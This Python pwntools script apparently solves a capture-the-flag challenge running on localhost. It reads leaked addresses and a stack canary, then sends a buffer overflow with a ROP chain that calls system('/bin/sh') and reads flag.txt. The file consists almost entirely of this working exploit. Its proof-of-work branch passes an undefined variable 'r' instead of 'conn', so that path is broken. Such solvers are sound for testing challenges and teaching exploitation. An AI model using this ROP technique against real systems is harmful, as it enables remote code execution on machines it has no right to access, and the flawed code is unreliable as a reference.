#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import pwnlib.tubes

def handle_pow(r):
    print(r.recvuntil(b'python3 '))
    print(r.recvuntil(b' solve '))
    challenge = r.recvline().decode('ascii').strip()
    p = pwnlib.tubes.process.process(['kctf_bypass_pow', challenge])
    solution = p.readall().strip()
    r.sendline(solution)
    print(r.recvuntil(b'Correct\n'))

from pwn import *
import time

conn = remote('127.0.0.1', 1337)
print(conn.recvuntil(b'== proof-of-work: '))
if conn.recvline().startswith(b'enabled'):
   handle_pow(r)

conn.recvuntil(b"system @ 0x")
system_addr = int(conn.recvline().strip(), 16)
info("system: " + hex(system_addr))
conn.recvuntil(b"pop rdi; ret @ 0x")
pop_rdi = int(conn.recvline().strip(), 16)
info("pop rdi: " + hex(pop_rdi))
conn.recvuntil(b"ret @ 0x")
ret = int(conn.recvline().strip(), 16)
info("ret: " + hex(ret))
conn.recvuntil(b'"/bin/sh" @ 0x')
bin_sh = int(conn.recvline().strip(), 16)
info("sh: " + hex(bin_sh))
conn.recvuntil(b"canary: 0x")
canary = int(conn.recvline().strip(), 16)
info("canary: " + hex(canary))

conn.sendline(b"a"*56 + p64(canary) + p64(0) + p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(system_addr))
conn.sendline(b"cat flag.txt")
res= conn.recvuntil(b"}")
if b"ictf" in res:
    exit(0)
exit(1)
